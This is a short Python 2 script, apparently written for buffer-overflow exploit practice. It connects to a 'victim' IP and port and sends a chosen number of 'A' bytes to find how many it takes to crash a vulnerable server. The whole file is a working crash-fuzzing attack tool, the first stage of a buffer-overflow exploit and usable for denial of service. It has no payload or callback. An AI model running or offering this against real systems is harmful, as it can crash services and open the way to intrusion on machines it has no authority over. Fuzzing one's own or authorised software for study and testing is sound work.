#!/usr/bin/python


import sys, argparse, socket

# function definitions
def buffer_gen(bytes_to_send):                   
    buf = 'A' * bytes_to_send

    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, bytes_to_send)
    try:
        s = socket_setup(input_tuple[0], input_tuple[1])

        buf = buffer_gen(input_tuple[2])

        #print "sending buffer: ", buf
        #print "buffer length: ", len(buf)
        s.send(buf)
        s.close()

        print "\nSent!"
    except:
        print "\n[!] Could not connect"
        sys.exit(0) 

# script execution
if __name__ == "__main__":

    # user input
    program_description = "The program inputs ip and port of the victim pc, and bytes to send to the vulnerable server/program to see how much it takes to crash the program"
    parser = argparse.ArgumentParser(program_description)
    parser.add_argument("target_ip", help="Target IP")
    parser.add_argument("target_port", type=int, help="Target Port")
    parser.add_argument("bytes_to_send", type=int, help="The bytes of the string that will be sent to victim pc")
    args = parser.parse_args()

    # global parameters
    user_input = (args.target_ip, args.target_port, args.bytes_to_send)
    
    main(user_input)        # calling main function

